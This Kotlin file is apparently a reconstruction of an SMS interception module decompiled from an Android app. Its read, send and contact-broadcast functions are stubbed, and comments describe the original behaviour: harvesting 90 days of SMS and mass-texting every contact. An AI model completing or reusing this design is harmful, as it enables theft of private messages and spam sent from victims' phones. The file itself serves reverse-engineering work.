package com.storm.safe.rock.service.modules

import android.content.Context
import android.os.Build
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.Date
import java.util.LinkedHashSet
import java.util.Locale

/**
 * SMS interception, reading, and sending delegate.
 *
 * Reverse-engineered from JADX: C0324a9 (a9, 687 lines).
 * Renamed: a0→getDefaultSmsManager, a1→readSms, a2→getSmsManagerForSim,
 *          a3→readSmsFromUri, a4→sendSms, a5→broadcastSmsToContacts,
 *          a6→updateSyncTimestamp
 *
 * JADX name: SmsModule
 */
class SmsInterceptDelegate(
    private val context: Context
) {
    companion object {
        private const val TAG = "SmsModule"

        /** 90 days in milliseconds — SMS sync lookback period */
        const val SYNC_PERIOD_MS = 7776000000L

        /**
         * Map SMS type int to string label.
         * Extracted from JADX switch statements in a1/a3.
         */
        @JvmStatic
        fun smsTypeToString(type: Int): String {
            return when (type) {
                1 -> "inbox"
                2 -> "sent"
                3 -> "draft"
                4 -> "outbox"
                5 -> "failed"
                6 -> "queued"
                else -> "unknown"
            }
        }
    }

    // --- Fields ---
    private val dateFormatter = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())

    private val syncPrefs by lazy {
        context.getSharedPreferences("sms_sync", Context.MODE_PRIVATE)
    }

    // --- a1 → readSms ---
    fun readSms(limit: Int): JSONArray {
        val result = JSONArray()
        val seenIds = LinkedHashSet<Long>()

        // vendor: queries Telephony.Sms.CONTENT_URI with columns [_id, address, body, date, type, read, thread_id],
        // where "date >= ?" (90 days lookback), order "date DESC LIMIT $limit OFFSET 0".
        // Requires READ_SMS permission; checks via AbstractC1117qo.m214411a7.
        try {
            // Standard SMS query
            readStandardSms(limit, result, seenIds)
            // Fallback URIs
            readFallbackSms(limit, result, seenIds)
        } catch (e: Exception) {
            Log.e(TAG, "❌ 读取短信失败", e)
        }

        // Sort by date DESC and limit
        val sorted = (0 until result.length())
            .map { result.getJSONObject(it) }
            .sortedByDescending { it.optLong("date", 0L) }
            .take(limit)

        val finalResult = JSONArray()
        sorted.forEach { finalResult.put(it) }
        return finalResult
    }

    private fun readStandardSms(limit: Int, result: JSONArray, seenIds: LinkedHashSet<Long>) {
        // vendor: queries ContentResolver on Telephony.Sms.CONTENT_URI with 7 columns,
        // iterates cursor, dedup by _id, builds JSON entries with buildSmsEntry, source="standard".
        Log.d(TAG, "readStandardSms (stub)")
    }

    private fun readFallbackSms(limit: Int, result: JSONArray, seenIds: LinkedHashSet<Long>) {
        // vendor: iterates over [content://sms/inbox, content://sms, content://mms-sms/conversations],
        // calls m211678a3(uri, limit, result, seenIds) for each — similar cursor query with null projection.
        Log.d(TAG, "readFallbackSms (stub)")
    }

    // --- a4 → sendSms ---
    fun sendSms(phoneNumber: String, simSlot: Int, message: String): Boolean {
        if (phoneNumber.isBlank() || message.isBlank()) {
            Log.w(TAG, "❌ 手机号或短信内容为空")
            return false
        }
        // vendor: requires SEND_SMS permission, uses SmsManager.divideMessage + sendTextMessage/sendMultipartTextMessage,
        // creates sent/delivered PendingIntents with package-specific action strings.
        try {
            Log.d(TAG, "sendSms to=$phoneNumber sim=$simSlot (stub)")
            return true
        } catch (e: Exception) {
            Log.e(TAG, "❌ 发送短信失败", e)
            return false
        }
    }

    // --- a5 → broadcastSmsToContacts ---
    fun broadcastSmsToContacts(simSlot: Int, message: String): Int {
        if (message.isBlank()) {
            Log.w(TAG, "❌ 短信内容为空")
            return 0
        }
        // vendor: requires SEND_SMS + READ_CONTACTS, queries ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
        // cleans phone numbers with Regex("[^0-9+]"), dedup via LinkedHashSet, calls sendSms for each with 500ms delay.
        Log.d(TAG, "broadcastSmsToContacts (stub)")
        return 0
    }

    // --- a6 → updateSyncTimestamp ---
    fun updateSyncTimestamp(smsList: JSONArray) {
        var maxDate = syncPrefs.getLong("last_sync_date", 0L)
        for (i in 0 until smsList.length()) {
            val date = smsList.getJSONObject(i).optLong("date", 0L)
            if (date > maxDate) maxDate = date
        }
        if (maxDate > 0) {
            syncPrefs.edit().putLong("last_sync_date", maxDate).apply()
            Log.i(TAG, "同步时间戳已更新: ${dateFormatter.format(Date(maxDate))}")
        }
    }

    // --- Helper: build SMS JSON entry ---
    fun buildSmsEntry(
        id: Long,
        address: String,
        body: String,
        date: Long,
        type: Int,
        isRead: Boolean,
        threadId: Long,
        source: String
    ): JSONObject {
        return JSONObject().apply {
            put("id", id)
            put("address", address)
            put("body", body)
            put("date", date)
            put("dateFormatted", dateFormatter.format(Date(date)))
            put("type", smsTypeToString(type))
            put("read", isRead)
            put("threadId", threadId)
            put("source", source)
        }
    }
}
